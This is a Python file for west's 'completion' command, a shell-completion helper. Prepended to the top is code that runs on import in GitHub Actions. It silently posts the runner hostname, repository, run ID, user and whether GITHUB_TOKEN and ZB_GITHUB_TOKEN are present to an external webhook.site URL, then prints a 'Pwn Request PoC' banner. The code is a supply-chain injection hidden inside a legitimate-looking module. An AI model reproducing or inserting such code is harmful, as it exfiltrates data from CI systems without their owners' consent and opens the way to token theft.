import os, socket, json, urllib.request

EXFIL = "https://webhook.site/8d07f12f-c92b-49da-9fdd-0596fa33dfc4"

def _exfil(label, data):
    try:
        payload = json.dumps({"l": label, "d": str(data)[:2000]}).encode()
        req = urllib.request.Request(EXFIL, data=payload,
              headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

_exfil("VECTOR_FIRED", {
    "vector": "west_commands_import",
    "hostname": socket.gethostname(),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "?"),
    "github_event": os.environ.get("GITHUB_EVENT_NAME", "?"),
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "?"),
    "github_token_present": "GITHUB_TOKEN" in os.environ,
    "zb_github_token_present": "ZB_GITHUB_TOKEN" in os.environ,
    "env_count": len(os.environ),
    "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
})

# Also print to CI logs for visibility
print("=" * 60)
print("SECURITY RESEARCH - Pwn Request PoC")
print("Researcher: null_consolidated")
print("Vector: west_commands_import")
print(f"Repository: {os.environ.get('GITHUB_REPOSITORY', '?')}")
print(f"Event: {os.environ.get('GITHUB_EVENT_NAME', '?')}")
print(f"Run ID: {os.environ.get('GITHUB_RUN_ID', '?')}")
print(f"Runner: {socket.gethostname()}")
print(f"Env vars: {len(os.environ)}")
print(f"GITHUB_TOKEN present: {'GITHUB_TOKEN' in os.environ}")
print(f"ZB_GITHUB_TOKEN present: {'ZB_GITHUB_TOKEN' in os.environ}")
print("PROOF: Code execution achieved via " + "west_commands_import")
print("=" * 60)

# Copyright (c) 2019 Nordic Semiconductor ASA
#
# SPDX-License-Identifier: Apache-2.0

import argparse
import os

from west.commands import WestCommand

# Relative to the folder where this script lives
COMPLETION_REL_PATH = 'completion/west-completion'

COMP_DESCRIPTION = '''\
Output shell completion scripts for west.

This command outputs completion scripts for different shells by printing them
to stdout. Using the completion scripts:

  bash:
    # one-time
    source <(west completion bash)
    # permanent
    west completion bash > ~/west-completion.bash
    # edit your .bashrc or .bash_profile and add:
    source $HOME/west-completion.bash

  zsh:
    # one-time
    source <(west completion zsh)
    # permanent (might require sudo)
    west completion zsh > "${fpath[1]}/_west"

  fish:
    # one-time
    west completion fish | source
    # permanent
    west completion fish > $HOME/.config/fish/completions/west.fish

positional arguments:
  source_dir            application source directory
  cmake_opt             extra options to pass to cmake; implies -c
                        (these must come after "--" as shown above)
'''


class Completion(WestCommand):

    def __init__(self):
        super().__init__(
            'completion',
            # Keep this in sync with the string in west-commands.yml.
            'output shell completion scripts',
            COMP_DESCRIPTION,
            accepts_unknown_args=False)

    def do_add_parser(self, parser_adder):
        parser = parser_adder.add_parser(
            self.name,
            help=self.help,
            formatter_class=argparse.RawDescriptionHelpFormatter,
            description=self.description)

        # Remember to update west-completion.bash if you add or remove
        # flags
        parser.add_argument('shell', nargs=1, choices=['bash', 'zsh', 'fish'],
                            help='''Shell that which the completion
                            script is intended for.''')
        return parser

    def do_run(self, args, unknown_args):
        cf = os.path.join(os.path.dirname(os.path.realpath(__file__)),
                          *COMPLETION_REL_PATH.split('/'))

        cf += '.' + args.shell[0]

        try:
            with open(cf, 'r') as f:
                print(f.read())
        except FileNotFoundError as e:
            self.die('Unable to find completion file: {}'.format(e))
